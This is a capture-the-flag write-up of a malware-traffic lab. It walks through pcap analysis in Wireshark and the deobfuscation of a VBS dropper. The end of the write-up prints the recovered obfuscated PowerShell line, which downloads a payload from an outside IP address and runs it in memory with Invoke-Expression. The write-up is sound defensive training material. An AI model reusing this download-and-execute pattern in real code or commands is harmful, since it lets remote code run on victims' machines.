CyberDefenders CTF Lab XLMRat
---

https://cyberdefenders.org/blueteam-ctf-challenges/xlmrat/

#### Scenario

Analyze network traffic to identify malware delivery, deobfuscate scripts, and map attacker techniques using MITRE ATT&CK, focusing on stealthy execution and reflective code loading.


#### Machine Environment 

- Windows 10 running in VMware workstation
- Flare Windows Install https://github.com/mandiant/flare-vm
- WireShark


### 1.  The attacker successfully executed a command to download the first stage of the malware. What is the URL from which the first malware stage was installed?
---

This pcap consists of 2 host conversations.
	
Wireshark -> Statistics -> Conversations

![image](https://github.com/user-attachments/assets/fe8eb902-92f8-42c3-86f2-251547f74dae)

The first GET request is for a xlm.txt file sourced from 10.1.9.101 and destined to 45.126.209.4

![image](https://github.com/user-attachments/assets/5387616c-63b1-4456-883b-c174120e23e0)

Use WireShark to export the HTTP files to your Windows Flare VM
	
File -> Export Objects -> HTTP

![image](https://github.com/user-attachments/assets/43b4cef2-81a7-46b1-93e1-0bba88230c9c)

The xlm.txt file contains a Visual Basic Script (VBS) that declares an array and stores pieces of code that gets concatenated using a for loop.

![image](https://github.com/user-attachments/assets/bf331842-daba-41a5-abca-11a863e6ae8d)

***RUN CODE AT YOUR OWN RISK
 
By placing the wscript.echo command we can view the output of the variable to the console.

![image](https://github.com/user-attachments/assets/96a50816-aebd-4861-b747-3c543bc282e9)

Open a command prompt and run the .vbs file with cscript.exe displaying the output. 

![image](https://github.com/user-attachments/assets/14dea8b7-4225-46fc-9493-9841ff497ff3)

Bring the output into a text editor and clean it up.  The "[BYTe[]]" lines are not useful and probably a way to confuse people and machine.  

	$A123 = "IeX(NeW-OBJeCT NeT.W"
	$B456 = "eBCLIeNT).DOWNLO"
	$C789 = "'VAN(''http://45.126.209.4:222/mdm.jpg'')'.RePLACe('VAN','ADSTRING')"
	IeX($A123+$B456+$C789)

This script downloads the first stage of malware and executes in into memory using Invoke-Expression (IeX)























